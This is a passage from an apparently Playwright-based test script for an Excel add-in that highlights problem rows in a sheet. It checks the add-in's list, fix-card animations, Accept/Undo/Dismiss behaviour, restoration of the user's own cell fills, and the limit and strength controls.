      return { time: t?.textContent, weight: c?.fontWeight, size: c && parseFloat(c.fontSize), muted: c?.color === getComputedStyle(document.querySelector("#list-hint")).color,
        filter: document.getElementById("kind-filter").checkVisibility(), first: Math.round(row.getBoundingClientRect().top + scrollY) }; });
    ok(/^Checked in \d+ seconds?\.$/.test(m.time) && m.weight === "400" && m.size >= 13 && m.size <= 14 && m.muted, "AH-228 fix round 1: Checked in N seconds is hint text after the finding - " + JSON.stringify(m));
    ok(!m.filter && m.first <= 560, "AH-228 fix round 1: 5 rows listed: no kind buttons, the first row at most 560 px down at 360 px - " + JSON.stringify(m)); }
  const listed = await page.$$eval("#flagged-list button", (bs) => bs.slice(0, 5).map((b) => b.innerText.split("\n")[0]));
  ok(["11", "22", "51", "81", "121"].every((r) => listed.some((l) => l.startsWith(`Row ${r}`))), "all 5 planted problems listed first - " + listed);
  ok(!(await text("#flagged-list")).includes("weird limit"), "no jargon in the list");
  // a sales sheet's Region alone says nothing about people: no fairness sentence, no checks listed (AH-39: a place or an
  // age alone is a sales sheet's or a house's as often - Texas cities' house sales got "a real gap")
  ok(!(await page.isVisible("#fairness-note")) && (await page.$$("#fairness-list li")).length === 0,
    "fairness: a sheet with no column about people claims nothing - " + (await text("#fairness-note")));
  // AH-40: exactly the cells each reason names - row 11's Units, UnitCost and Total (its total does not add up), the
  // duplicate's whole row, the "east " Region, the blank Units - and no other cell of those rows
  const fills = await page.evaluate(() => ["C11", "D11", "E11", "C22", "A51", "E51", "B81", "C121", "A2"].map((a) => __cell("Sales", a).fill));
  ok(fills.slice(0, 8).every((f) => f === "#FFEB9D") && fills[8] === null, "the named cells highlighted, clean rows not - " + fills);
  const beside = await page.evaluate(() => ["A11", "B11", "A22", "B22", "A81", "C81", "A121", "B121"].map((a) => __cell("Sales", a).fill));
  ok(beside.join() === "#00B050,#00B050,,#00B0F0,,,,", "no other cell of a flagged row is coloured; the user's own fills stay - " + beside);

  // AH-94: a list row, hovered or reached by keyboard, fills navy from the left and steps up on a shadow; its words stay
  { const row = page.locator("#flagged-list button").first(), look = () => page.evaluate(() => { const b = document.querySelector("#flagged-list button");
      return [getComputedStyle(b, "::before").transform, getComputedStyle(b).transform, getComputedStyle(b, "::after").opacity, getComputedStyle(b).zIndex, b.textContent]; });
    const before = await look();
    await row.hover();
    await midShot("row-mid-fill", 40);
    await page.waitForTimeout(600);
    const after = await look();
    await shot("podium-row");
    ok(before[0] === "matrix(0, 0, 0, 1, 0, 0)" && after[0] === "matrix(1, 0, 0, 1, 0, 0)" && scaleOf(before[1]) === 1 && scaleOf(after[1]) > 1.01 && +after[2] === 1 && after[3] === "2" && after[4] === before[4],
      "a hovered row: the fill sweeps from scaleX(0) to scaleX(1), the row lifts above its neighbours on a shadow, its words unchanged - " + JSON.stringify([before.slice(0, 4), after.slice(0, 4)]));
    await page.mouse.move(1, 1); await page.focus("#strength-box > summary"); await page.keyboard.press("Tab"); await page.waitForTimeout(600); // from the control before the list: since AH-175, the folded slider's summary (a list of 5 has no kind buttons, AH-228 fix round 1)
    const keyed = await page.evaluate(() => { const b = document.activeElement; return [b.matches("#flagged-list button:focus-visible"), getComputedStyle(b, "::before").transform, getComputedStyle(b).transform]; });
    ok(keyed[0] && keyed[1] === "matrix(1, 0, 0, 1, 0, 0)" && scaleOf(keyed[2]) > 1.01, "keyboard focus gets the same fill and lift - " + keyed);
    await page.evaluate(() => document.activeElement.blur()); }

  // AH-149: the card hinges at the height of the row it came from (two rows, two heights), and the row's head flies to
  // the card's title and home again, named for the view transition only while it runs
  for (const r of [11, 81]) {
    const row = page.locator(`#flagged-list button:has-text("Row ${r} ")`);
    await row.scrollIntoViewIfNeeded(); // where it is when it is pressed (the list scrolls)
    const mid = await row.evaluate((b) => { const k = b.getBoundingClientRect(); return k.top + k.height / 2; }); // on screen, as the eye finds it
    await watchVt();
    await row.click(); await idle(); await vtDone();
    const card = await page.evaluate(() => { const v = document.getElementById("fix-view"); return { top: v.getBoundingClientRect().top, origin: getComputedStyle(v).transformOrigin,
      names: [...document.querySelectorAll(".row-head, #fix-title")].map((e) => getComputedStyle(e).viewTransitionName).filter((n) => n !== "none") }; });
    const y = parseFloat(card.origin.split(" ")[1]), opened = await page.evaluate(() => __vt.some(Boolean));
    ok(Math.abs(y - (mid - card.top)) <= 4, `AH-149: opening row ${r}, the card hinges at that row's height (${Math.round(mid - card.top)} px from its top): ${card.origin}`);
    ok(opened && !card.names.length, `AH-149: opening row ${r}, its head flies to the card's title in a view transition, and no name is left after - ${JSON.stringify({ opened, names: card.names })}`);
    // AH-165: the card opens at the top of the pane, right under its header: the scan controls and their held band of
    // space stood over it (John, the pane at 360 px), and Back brings them again
    const top = await page.evaluate(() => ({ under: document.getElementById("fix-back").getBoundingClientRect().top - document.querySelector("#app-body > header").getBoundingClientRect().bottom,
      hero: document.querySelector(".pane-hero").checkVisibility() }));
    ok(top.under >= 0 && top.under <= 100 && !top.hero, `AH-165: opening row ${r}, its card's Back sits right under the pane's header, the scan controls out of the way - ` + JSON.stringify(top));
    await watchVt();
    await back(); await vtDone();
    ok(await page.isVisible("#scan") && await page.isVisible("#strength-box"), `AH-165: Back from row ${r} brings Find problems and the slider (folded since AH-175) again`);
    const home = await page.evaluate(() => ({ vt: __vt.some(Boolean), names: [...document.querySelectorAll(".row-head, #fix-title")].map((e) => getComputedStyle(e).viewTransitionName).filter((n) => n !== "none") }));
    ok(home.vt && !home.names.length && (await page.isVisible("#results")), `AH-149: Back flies the title home to row ${r} - ` + JSON.stringify(home));
  }

  // AH-170: a date in a reason stays on one line: "2026-01-" / "26" broke at its hyphen at 320 px, in the list and the card
  { const whole = (sel) => page.evaluate((sel) => { const w = document.createTreeWalker(document.querySelector(sel), NodeFilter.SHOW_TEXT), out = [];
      for (let t; (t = w.nextNode());) for (const d of t.data.match(/\d{4}-\d{2}-\d{2}/g) || []) out.push(t.data === d && getComputedStyle(t.parentElement).whiteSpace === "nowrap" ? "kept" : `split: ${t.data}`);
      return out; }, sel);
    const list = await whole("#flagged-list"); await openRow(22); const card = await whole("#fix-reason"); await back();
    ok(list.length && card.length && [...list, ...card].every((d) => d === "kept"), "AH-170: every date in a reason, in the list and on the card, is kept on one line - " + JSON.stringify({ list, card })); }

  // AH-170: keyboard focus follows each card action. It fell to the page (BODY) when the pressed button was hidden or
  // turned off: opening a row, Accept, Undo, Next row and Back, and a keyboard user started again from the top
  { const at = () => page.evaluate(() => { const a = document.activeElement; return a.closest("#flagged-list") ? "row " + /^Row (\d+)/.exec(a.innerText)?.[1] : a.id || a.tagName; });
    const press = async (sel) => { await page.focus(sel); await page.keyboard.press("Enter"); await idle(); };
    await press('#flagged-list button:has-text("Row 81 ")');
    await page.waitForFunction(() => document.getElementById("fix-changes").children.length || document.getElementById("fix-explanation").textContent);
    const steps = { opened: await at() };
    await press("#fix-apply"); steps.accepted = await at();
    await page.keyboard.press("Enter"); await idle(); steps.undone = await at(); // Enter on what has the focus: Undo
    await page.keyboard.press("Enter"); await idle(); // and on Accept again, so Next row shows
    await press("#fix-next"); steps.next = [await at(), await text("#fix-title")];
    await press("#fix-back"); await page.waitForSelector("#results", { state: "visible" }); steps.back = await at();
    const nextRow = /^Row (\d+)/.exec(steps.next[1])?.[1];
    ok(steps.opened === "fix-title" && steps.accepted === "fix-undo" && steps.undone === "fix-apply" && steps.next[0] === "fix-title" && nextRow && nextRow !== "81" && steps.back === `row ${nextRow}`,
      "AH-170: by keyboard, focus goes to the card's title on opening, to Undo after Accept, to Accept after Undo, to the next card's title after Next row, and back to its row after Back - " + JSON.stringify(steps));
    await openRow(81); await page.click("#fix-undo"); await idle(); await back(); } // row 81 as it was, for what follows

  // 2) open a row's card, Accept (Agent 3 checks it again, highlight goes), Undo
  { // AH-94: the card turns in like a page (finite, so nothing waits on it forever) and lies flat by 800 ms
    await page.click('#flagged-list button:has-text("Row 11 ")');
    // since AH-149 the card is drawn once the view transition has the list's picture, a frame after the click: read the
    // turn once it has begun
    await page.waitForFunction(() => document.getElementById("fix-view").getAnimations().length > 0, null, { polling: "raf", timeout: 3000 }).catch(() => {});
    const turning = await page.evaluate(() => { const v = document.getElementById("fix-view"), a = v.getAnimations({ subtree: true });
      return { t: getComputedStyle(v).transform, n: a.length, end: Math.max(...a.map((x) => x.effect.getComputedTiming().endTime)) }; });
    await idle(); await page.waitForFunction(() => document.getElementById("fix-changes").children.length || document.getElementById("fix-explanation").textContent);
    // 800 ms from the turn's own start, not from the click: on a slow Windows runner the turn began after the click's
    // handler, so 800 ms after the click it was still 0.03 deg short of flat (Build Arcas.exe run 42088083206)
    await page.waitForFunction(() => document.getElementById("fix-view").getAnimations({ subtree: true })
      .every((a) => a.startTime !== null && document.timeline.currentTime >= a.startTime + 800));
    const flat = await page.evaluate(() => ({ t: getComputedStyle(document.getElementById("fix-view")).transform, n: document.getElementById("fix-view").getAnimations({ subtree: true }).length }));
    ok(turning.n >= 1 && turning.t !== "none" && turning.end > 0 && turning.end <= 700 && flat.t === "none" && flat.n === 0,
      "opening a row turns its card in like a page, in under 700 ms, then it lies flat - " + JSON.stringify({ turning, flat }));
    if (process.env.SHOTS) { // the turn once more, held half-way for its picture
      await page.evaluate(async () => { const { turnIn } = await import("./components/motion.js"); turnIn(document.getElementById("fix-view")); });
      await midShot("card-mid-turn", 160, "#fix-view");
      await page.waitForTimeout(700); }
    // AH-149: a proposed change is not a control, so it no longer steps up on hover (it said "press me")
    await page.hover("#fix-changes li"); await page.waitForTimeout(500);
    const step = await page.evaluate(() => getComputedStyle(document.querySelector("#fix-changes li")).transform);
    ok(step === "none", "a proposed change does not lift on hover: it is not a control - " + step);
    await page.mouse.move(1, 1);
    // AH-149: a turn started while one runs goes on from the card's angle: a second turn 150 ms into the first never
    // snaps back to 80deg (no jump over 15deg from one frame to the next), and the card lies flat at the end
    const frames = await page.evaluate(async () => { const { turnIn } = await import("./components/motion.js"), v = document.getElementById("fix-view"), out = [];
      let on = true; const f = () => { out.push(getComputedStyle(v).transform); if (on) requestAnimationFrame(f); };
      turnIn(v); requestAnimationFrame(f);
      await new Promise((go) => setTimeout(go, 150)); turnIn(v);
      await Promise.all(v.getAnimations().map((a) => a.finished.catch(() => {}))); await new Promise((go) => requestAnimationFrame(go)); on = false;
      return out; });
    const angles = frames.map(angleOf), jump = Math.max(...angles.slice(1).map((a, k) => Math.abs(a - angles[k])));
    ok(angles.length > 10 && jump <= 15 && angles.at(-1) < 0.5, `AH-149: Next row pressed mid-turn: the card turns on from where it is, its biggest step between frames ${jump.toFixed(1)}deg - ${angles.map((a) => a.toFixed(0)).join(",")}`); }
  ok((await text("#fix-title")) === "Row 11: probably wrong", "fix view titled in words");
  { await page.evaluate((pairs) => { for (const [c, w] of pairs) { const p = document.createElement("p"); p.className = "probe"; p.textContent = `${w} probe text`; p.style.color = c; document.querySelector(".fix-result").append(p); } },
      [["oklch(0.25 0.06 265)", "dark"], ["oklch(0.86 0.02 90)", "pale"]]);
    const probe = (await page.evaluate(contrastProblems)).filter((b) => b.includes("probe text"));
    await page.evaluate(() => document.querySelectorAll(".probe").forEach((p) => p.remove()));
    ok(probe.length === 1 && probe[0].includes("pale"), "AH-149: the contrast gate reads an OKLCH colour as the browser draws it - " + JSON.stringify(probe)); }
  await contrast("a row's card, Ask AI's box shown");
  ok((await text("#fix-reason")) === "Total 170.43 does not add up: Units × UnitCost = -14.95\nUnits is -5, below its usual limit of 0",
    "reason in plain words - " + (await text("#fix-reason")));
  ok((await text("#fix-changes")).startsWith("C11: -5 → "), "preview old -> new");
  ok(await page.isVisible("#fix-dismiss") && !(await page.isVisible("#fix-next")), "card asks: Accept or Dismiss");
  const logged = await page.evaluate(() => __log.length); // every cell value Excel was asked to write, in order
  const wrote = () => page.evaluate((n) => __log.slice(n).map((w) => `${w[1]}!${w[2]}`).join(), logged);
  const c1 = calls.length;
  // AH-155: no test repainted a highlighted cell of the row, so Accept putting back every cell of it passed
  await page.evaluate(() => __fill("Sales", "D11", "#FF0000"));
  await page.click("#fix-apply"); await idle();
  ok((await cell("C11")).v !== -5 && (await page.isVisible("#fix-undo")) && (await text("#fix-apply")) === "Accepted", "Accept writes the cell");
  // AH-171: a finish line in the foot bar after each decision (nothing moves, AH-165): the list's rows, counted
  ok((await text("#notice")) === "1 of 5 rows done.", "AH-171: Accept says how many rows are done - " + (await text("#notice")));
  { const l = await line(); ok(l.shown && Math.abs(l.wide - 0.2) < 1e-6 && l.out, "AH-184: and draws it, a gold line a fifth of the foot bar wide, out of the flow - " + JSON.stringify(l)); }
  ok(since(c1) === "/check" && calls[c1][1].row_index === 9, "Accept asks the engine once, /check for that row (never a full /scan) - " + since(c1));
  ok(await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).includes("fixed")), "Accept keeps the decision in the workbook");
  ok((await wrote()) === "Sales!C11", "Accept wrote exactly the one targeted cell, nothing else - " + (await wrote()));
  ok((await text("#fix-status")).includes("looks right now"), "checker re-scanned the fixed row - " + (await text("#fix-status")));
  ok(await page.evaluate(() => document.getElementById("fix-status").classList.contains("tick")), "AH-149: a fix that checks out gets a check mark, once");
  ok((await cell("C11")).fill === "#00B050" && (await cell("E11")).fill === "#00B050", "fixed row: highlight gone, the user's own green back");
  ok((await cell("D11")).fill === "#FF0000", "and a cell of it the user repainted since keeps the user's colour - " + (await cell("D11")).fill);
  ok(await page.isVisible("#fix-next") && !(await page.isVisible("#fix-dismiss")), "then Undo / Next row");
  await back();
  // AH-184: back on the list, the row just fixed turns to its done look in front of you, once: its old tag and swatch
  // fade out over "Fixed" (opacity only, 250 ms), hidden from screen readers; a second Back finds nothing to turn
  { const turn = () => page.evaluate(() => { const li = [...document.querySelectorAll("#flagged-list li")].find((l) => /^Row 11\b/.test(l.innerText));
      const was = li.querySelector(".was");
      return { was: was && [was.getAttribute("aria-hidden"), was.textContent, !!was.querySelector(".swatch")],
        fades: li.getAnimations({ subtree: true }).filter((a) => !a.transitionProperty && !a.animationName)
          .map((a) => [Object.keys(a.effect.getKeyframes()[0]).filter((k) => !["offset", "easing", "composite", "computedOffset"].includes(k)).join(), a.effect.getTiming().duration]) }; });
    const first = await turn(); await page.waitForTimeout(900); const after = await turn();
    await openRow(11); await back(); const again = await turn();
    ok(first.was?.[0] === "true" && first.was[1] === "Probably wrong" && first.was[2] && first.fades.length === 2 && first.fades.every(([p, d]) => p === "opacity" && d === 250)
      && !after.was && !again.was && !again.fades.length, "AH-184: back on the list, the fixed row's old tag and swatch fade into \"Fixed\" once - " + JSON.stringify({ first, after, again })); }
  ok(/1 of \d+ done/.test(await text("#list-title")) && (await text("#flagged-list")).includes("Fixed"), "list keeps its rows and marks the fixed one - " + (await text("#list-title")));
  await openRow(11); // a fixed row opened again still offers Undo
  ok((await text("#fix-title")) === "Row 11: fixed" && (await page.isVisible("#fix-undo")) && (await text("#fix-changes")).startsWith("C11: -5 → "), "reopened fixed row offers Undo");
  const fixedTo = (await cell("C11")).v;
  await page.evaluate(() => __edit("Sales", "C11", 7)); // the user retypes the cell by hand
  await page.click("#fix-undo"); await idle();
  ok((await cell("C11")).v === 7 && (await text("#fix-status")).includes("changed after the fix"), "Undo never types over a hand edit");
  await page.evaluate((v) => __edit("Sales", "C11", v), fixedTo);
  await page.click("#fix-undo"); await idle();
  ok((await cell("C11")).v === -5 && !(await page.isVisible("#fix-undo")) && (await cell("C11")).fill === "#FFEB9D" && (await cell("A11")).fill === "#00B050",
    "Undo puts it back, highlight too (on the named cells only)");
  ok((await cell("D11")).fill === "#FF0000", "but never over the colour the user put on since - " + (await cell("D11")).fill);
  await page.evaluate(() => __fill("Sales", "D11", "#FFEB9D"));
  // AH-127: a double-click on Undo undid the fix, and its second click landed on Dismiss, drawn where Undo was: the row
  // was dismissed too (3 of 3 tries) and the card moved on to row 51. One click does one thing
  await page.click("#fix-apply"); await idle();
  await doubleClick("#fix-undo"); await idle(); await page.waitForTimeout(400);
  ok((await cell("C11")).v === -5 && (await text("#fix-title")).startsWith("Row 11") && (await page.isVisible("#fix-apply"))
    && !(await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length)),
    "a double-click on Undo undoes once and dismisses nothing: the card stays on row 11 - " + (await text("#fix-title")) + " / " + (await page.evaluate(() => JSON.stringify(__settings.anomalyHunterDecisions || {}))));
  await page.evaluate(() => __edit("Sales", "B11", "North")); // the row changes after the scan (edited / sorted)
  await page.click("#fix-apply"); await idle();
  ok((await cell("C11")).v === -5 && (await text("#fix-status")).includes("changed since the scan"), "changed row: Accept refuses instead of writing into the wrong record");
  await page.evaluate(() => __edit("Sales", "B11", "East"));

  // AH-127: a card turns in for 600 ms, and a click aimed at its Accept while it turned wrote a fix the user never chose.
  // Row 22 accepted, then Next row (row 11, listed next); its Accept clicked where it is drawn 50 ms into the turn
  await back(); await openRow(22); await page.click("#fix-apply"); await idle();
  // aimed once the card has settled, as a person aims (since AH-149 the row's head flies to the title first)
  await page.waitForFunction(() => document.getAnimations().every((a) => a.playState !== "running"), null, { timeout: 5000 }).catch(() => {});
  const n5 = await page.evaluate(() => __log.length), c5 = calls.length;
  // on screen first, as a person scrolls to it: since AH-149 the card is taller (44 px buttons, its fix area held)
  await page.locator("#fix-next").scrollIntoViewIfNeeded();
  { const b = await page.locator("#fix-next").boundingBox(); await page.mouse.click(b.x + b.width / 2, b.y + b.height / 2); }
  const turning = await page.waitForFunction(() => !document.getElementById("fix-apply").disabled && !document.getElementById("fix-apply").hidden
    && document.getElementById("fix-view").getAnimations().some((a) => a.playState === "running"), null, { polling: "raf", timeout: 3000 }).then(() => true, () => false);
  await page.waitForTimeout(50);
  { const b = await page.locator("#fix-apply").boundingBox(); if (b) await page.mouse.click(b.x + b.width / 2, b.y + b.height / 2); }
  await idle(); await page.waitForTimeout(300);
  ok(turning && (await text("#fix-title")).startsWith("Row 11") && (await page.evaluate(() => __log.length)) === n5 && !since(c5).includes("/check"),
    `a click on Accept while the next card turns in writes nothing and asks no /check - ${await text("#fix-title")}, turning ${turning}, posts "${since(c5)}", writes ${(await page.evaluate(() => __log.length)) - n5}`);
  await page.waitForFunction(() => document.getElementById("fix-view").getAnimations().every((a) => a.playState !== "running"), null, { timeout: 5000 }).catch(() => {});
  const n6 = await page.evaluate(() => __log.length), c6 = calls.length;
  { const b = await page.locator("#fix-apply").boundingBox(); if (b) await page.mouse.click(b.x + b.width / 2, b.y + b.height / 2); }
  await idle();
  ok((await page.evaluate((n) => __log.length - n, n6)) === 1 && since(c6) === "/check", `once it has turned in, a click on Accept writes once - "${since(c6)}"`);
  // both back as they were, for step 3 on
  if (await page.isVisible("#fix-undo")) { await page.click("#fix-undo"); await idle(); }
  await back(); await openRow(22); await page.click("#fix-undo"); await idle(); await back();
  await openRow(11);
  ok((await cell("C11")).v === -5 && (await cell("C22")).v === 7777 && !(await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).length)),
    "both undone: row 11 and row 22 hold their values again, no decision left");

  // 3) clicking a highlighted row in the sheet opens it too; Dismiss leaves it, unhighlighted, and opens the next
  await back();
  await page.evaluate(() => __userSelect("Sales", "B22"));
  await page.waitForFunction(() => document.getElementById("fix-title").textContent.startsWith("Row 22"), null, { timeout: 10000 }).catch(() => {});
  ok((await text("#fix-title")).startsWith("Row 22"), "sheet click opens the row");
  await idle();
  const beforeDismiss = await page.evaluate(() => __log.length), c2 = calls.length;
  await page.click("#fix-dismiss");
  // the next row's card turns in too
  ok(await page.waitForFunction(() => document.getElementById("fix-view").getAnimations().length > 0, null, { polling: "raf", timeout: 3000 }).then(() => true, () => false),
    "Dismiss: the next row's card turns in like a page");
  await idle();
  ok(calls.slice(c2).every(([p, b]) => p === "/suggest" && b.row_index !== 20) && (await page.evaluate(() => Object.values(__settings.anomalyHunterDecisions?.Sales || {}).includes("dismissed"))),
    "Dismiss asks the engine nothing about the row (the next card may look for a typo: /suggest, never for row 22) and keeps Dismissed in the workbook - " + JSON.stringify(calls.slice(c2).map(([p, b]) => [p, b?.row_index])));
  ok((await cell("C22")).v === 7777 && (await cell("C22")).fill === null && (await cell("B22")).fill === "#00B0F0", "Dismiss keeps the value and removes only our highlight");
  ok((await page.evaluate(() => __log.length)) === beforeDismiss, "Dismiss (and opening the next row) writes no cell at all");
  ok(/^Row \d+/.test(await text("#fix-title")) && !(await text("#fix-title")).startsWith("Row 22"), "and moves to the next row - " + (await text("#fix-title")));
  // AH-228 P-19: since then, after what the Dismiss taught and before its Undo
  ok((await text("#notice")) === "Dismissed. Units 7777 is fine on this sheet from now on. 1 of 5 rows done. Undo", "AH-171: Dismiss says how many rows are done - " + (await text("#notice")));
  { const l = await line(); ok(l.shown && Math.abs(l.wide - 0.2) < 1e-6, "AH-184: the line after Dismiss is 0.2 of the bar - " + JSON.stringify(l)); }
  // ... an Accept on top counts one more, and its Undo takes it back (row 11 as it was, for step 4)
  await back(); await openRow(11); await page.click("#fix-apply"); await idle();
  ok((await text("#notice")) === "2 of 5 rows done.", "AH-171: Accept after a Dismiss - " + (await text("#notice")));
  { const l = await line(); ok(l.shown && Math.abs(l.wide - 0.4) < 1e-6, "AH-184: the line after an Accept after a Dismiss is 0.4 of the bar - " + JSON.stringify(l)); }
  await page.click("#fix-undo"); await idle();
  ok((await cell("C11")).v === -5 && (await text("#notice")) === "1 of 5 rows done.", "AH-171: Undo takes its row back off the count - " + (await text("#notice")));
  { const l = await line(); ok(l.shown && Math.abs(l.wide - 0.2) < 1e-6, "AH-184: the line after Undo is 0.2 of the bar - " + JSON.stringify(l)); }

  // 4) Remove highlights puts back exactly what was there (the user's green row 11 too)
  await back();
  ok((await text("#flagged-list")).includes("Dismissed"), "the dismissed row is marked in the list");
  // AH-155: no test repainted a highlighted cell, so Remove highlights putting back every recorded cell passed
  await page.evaluate(() => __fill("Sales", "E51", "#FF0000"));
  await page.click("#clear-highlights"); await idle();
  ok((await cell("E51")).fill === "#FF0000", "a highlighted cell the user repainted since keeps the user's colour - " + (await cell("E51")).fill);
  await page.evaluate(() => __fill("Sales", "E51", null));
  const after = await page.evaluate(() => ["A11", "A22", "B22", "A51"].map((a) => __cell("Sales", a).fill));
  ok(after[0] === "#00B050" && after[1] === null && after[2] === "#00B0F0" && after[3] === null, "Remove highlights restores the old fills, cell by cell on a two-color row - " + after);
  ok((await text("#notice")).startsWith("Highlights removed"), "and says so");

  // 5) ...also after the pane was closed and opened again (a reload: the fake workbook keeps its cells, fills and saved
  // settings). AH-150: the old fills lived only in the pane's memory, so a reopened pane cleared every cell in our colours
  // to no fill (row 11's green was lost, and a whole row in Excel's own Neutral style went too), and Find problems after a
  // reopen took our own colour for each cell's fill, so no button could ever take those highlights off again.
  // The scan also sets the opening setting only once: written on every scan, it made Excel ask to save a workbook nothing
  // had changed, and opened the pane for everyone the file went to
  ok(await page.evaluate(() => __settings["Office.AutoShowTaskpaneWithDocument"] === true), "a scanned workbook opens with this pane");
  await page.evaluate(() => { const s = Office.context.document.settings, set = s.set; window.__sets = []; s.set = (k, v) => (__sets.push(k), set(k, v)); });
  await find();
  ok(await page.evaluate(() => !__sets.includes("Office.AutoShowTaskpaneWithDocument")), "a scan of a workbook that already opens with the pane does not set it again - " + (await page.evaluate(() => __sets)));
  await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" });
  // the user's own fills: a cell, and a cell and a whole row in Excel's own Bad and Neutral styles (one step off ours)
  await page.evaluate(() => { __fill("Sales", "A30", "#00B050"); __fill("Sales", "D40", "#FFC7CE"); for (const c of "ABCDE") __fill("Sales", c + "60", "#FFEB9C"); });
  const fillsAt = () => page.evaluate(() => ["C11", "E11", "A51", "B81", "C121", "B22", "A30", "D40", "A60", "E60"].map((a) => __cell("Sales", a).fill).join());
  const OWN = "#00B050,#00B050,,,,#00B0F0,#00B050,#FFC7CE,#FFEB9C,#FFEB9C";
  await find();
  ok((await cell("C11")).fill === "#FFEB9D" && (await cell("A51")).fill === "#FFEB9D", "reopened, then Find problems: the rows are highlighted again");
  await page.click("#clear-highlights"); await idle();
  ok((await fillsAt()) === OWN, "and Remove highlights puts back each cell's own fill, row 11's green too - " + (await fillsAt()));
  // AH-228 P-38: the button then says Show highlights again, and a press paints the last scan's highlights back
  const again = await text("#clear-highlights");
  await page.click("#clear-highlights"); await idle();
  ok(again === "Show highlights again" && (await cell("C11")).fill === "#FFEB9D" && (await cell("A51")).fill === "#FFEB9D" && (await text("#clear-highlights")) === "Remove highlights"
    && (await text("#notice")).startsWith("Highlights are back"), `AH-228 P-38: Show highlights again paints them back, and the button says Remove highlights again - ${again}, ${(await cell("C11")).fill}, ${await text("#notice")}`);
  await page.click("#clear-highlights"); await idle();
  ok((await fillsAt()) === OWN, "removed again: the user's Bad and Neutral styles, a whole row too, stay - " + (await fillsAt()));
  // the workbook no longer holds the old fills (Forget, or a pane from before AH-150): a cell in our colour that a scan
  // flags again is our highlight, never the user's fill, so Remove highlights takes it off
  await find(); await page.reload(); await page.waitForSelector("#main-ui", { state: "visible" });
  await page.evaluate(() => delete __settings.anomalyHunterHighlights); await find();
  await page.click("#clear-highlights"); await idle();
  ok(await page.evaluate(() => ["C11", "A51", "B81", "C121"].every((a) => __cell("Sales", a).fill === null)), "with no old fills kept, a scan then Remove highlights still takes every highlight off");
  await page.evaluate(() => { __fill("Sales", "A30", null); __fill("Sales", "D40", null); for (const c of "ABCDE") __fill("Sales", c + "60", null); });

  // 6) limits: plain words, bad input refused, saving rescans, "Back to automatic" resets
  // AH-228 P-35: one press opens the limits (a fold, then a button, was two), and the words never point at a folded slider
  const openStrict = async () => {};
  ok(await page.isVisible("#edit-limits") && !(await page.$("details:has(#edit-limits)")), "AH-228 P-35: Exact limits per column is one press under the list");
  const noticed = await text("#notice"); // Remove highlights' words, just above
  await page.click("#edit-limits");
  ok(noticed.startsWith("Highlights removed") && (await text("#notice")) === "", `AH-170: opening the limits editor clears the last action's notice - ${JSON.stringify([noticed, await text("#notice")])}`);
  const units = page.locator('#limits-rows .limits-row[data-column="Units"] input');
  await contrast("the limits editor");
  await units.nth(0).fill("200"); await units.nth(1).fill("100"); await page.click("#save-limits");
  ok((await text("#limits-error")).includes('"Flag below" is bigger than "Flag above"') && (await page.isVisible("#limits-editor")), "low above high is refused");
  // AH-170: letters in a limit box were read as an empty box, and the limit was taken off without a word
  { await units.nth(0).fill("-10"); await units.nth(1).click(); await units.nth(1).press("Control+a"); await page.keyboard.type("abc");
    const typed = await units.nth(1).inputValue(), k = calls.length;
    await page.click("#save-limits"); await page.waitForTimeout(300);
    ok(typed === "abc" && (await text("#limits-error")) === 'Units: type a number in "Flag above", or leave it empty for no limit.' && (await page.isVisible("#limits-editor"))
      && calls.length === k && (await page.evaluate(() => __settings.anomalyHunterLimits)) === undefined && (await units.nth(1).evaluate((x) => x === document.activeElement)),
      `AH-170: letters in a limit box are refused in plain words, the box focused, nothing saved or scanned - ${JSON.stringify({ typed, said: await text("#limits-error"), sent: since(k) })}`); }
  await units.nth(0).fill("-10"); await units.nth(1).fill("10000"); await page.click("#save-limits"); await idle();
  ok(!(await text("#flagged-list")).includes("Units is 7777"), "saved limits are used at once");
  ok(await page.evaluate(() => Object.keys(__settings.anomalyHunterLimits).join() === "Units"), "only the changed column is saved");
  await openStrict();
  await page.click("#edit-limits"); await page.click("#auto-limits"); await idle();
  ok(await page.evaluate(() => __settings.anomalyHunterLimits === undefined) && (await text("#flagged-list")).includes("Units is 7777"), "Use automatic limits");

  // 6b) the strength slider, driven by a real mouse: press the thumb, drag, let go -> re-check; 0 = basics only,
  // saved in the workbook; 5 brings everything back
  // a mouse can only drag what is on screen: bring the slider into view first, as a person scrolls up to it
  // since AH-175 the slider is folded: opened first, as a person presses "How hard to look"
  const track = async () => { await openLevel(); await page.locator("#strength").scrollIntoViewIfNeeded(); const b = await page.locator("#strength").boundingBox(); return { x: (v) => b.x + (b.width * v) / 10, y: b.y + b.height / 2 }; };
  const slide = async (from, to) => { const t = await track(); await page.mouse.move(t.x(from), t.y); await page.mouse.down(); await page.mouse.move(t.x(to), t.y, { steps: 8 }); await page.mouse.up(); };
  const level = () => page.getAttribute("#strength", "aria-valuenow");
  const listed5 = (await page.$$("#flagged-list li")).length;
  const s0 = scans.length;
  await watchSkeleton();
  await slide(5, 0); await idle();
  ok((await shown()).length === 1, "a slider re-check shows the scan skeleton too (no hold: it never waits for it) - " + (await shown()).map(Math.round));
  await page.waitForTimeout(800); // room for a second, unwanted re-scan to show up
  ok(scans.slice(s0).map((b) => b.strength).join() === "0", "a drag to 0 causes exactly one re-scan, at 0 - " + scans.slice(s0).map((b) => b.strength));
  { await page.$eval("#strength-box", (d) => (d.open = false)); // AH-175: a level other than 5 shows with the slider folded
    const said = await page.evaluate(() => [document.querySelector("#strength-box > summary").textContent, document.getElementById("strength-val").checkVisibility()]);
    await openLevel();
    ok(said[0] === "How hard to look: 0 of 10" && said[1], "AH-175: the folded slider's summary says the level it is at - " + JSON.stringify(said)); }
  { const m = await matchesEngine(); ok(m.ok, "at 0 the list is exactly what the engine answered at 0 - " + m.why); }
  // the pane says what the new level changed, counted from the engine's last two answers for this very sheet (AH-15)
  { const [b, a] = replies.slice(-2), said = await text("#level-change");
    const want = await page.evaluate(async ([rb, ra]) => { const { levelChange } = await import("./features/scan.js");
      return levelChange({ level: 5, rows: rb, hashes: __state.hashes, sheet: __state.lastScan.sheet }, { level: 0, rows: ra, hashes: __state.hashes, sheet: __state.lastScan.sheet }); }, [b.rows, a.rows]);
    ok(said.startsWith("Slider moved from 5 to 0: ") && said === want && (await page.isVisible("#level-change")), "a slider re-check says what level 0 changed against 5 - " + said); }
  const listed0 = (await page.$$("#flagged-list li")).length;
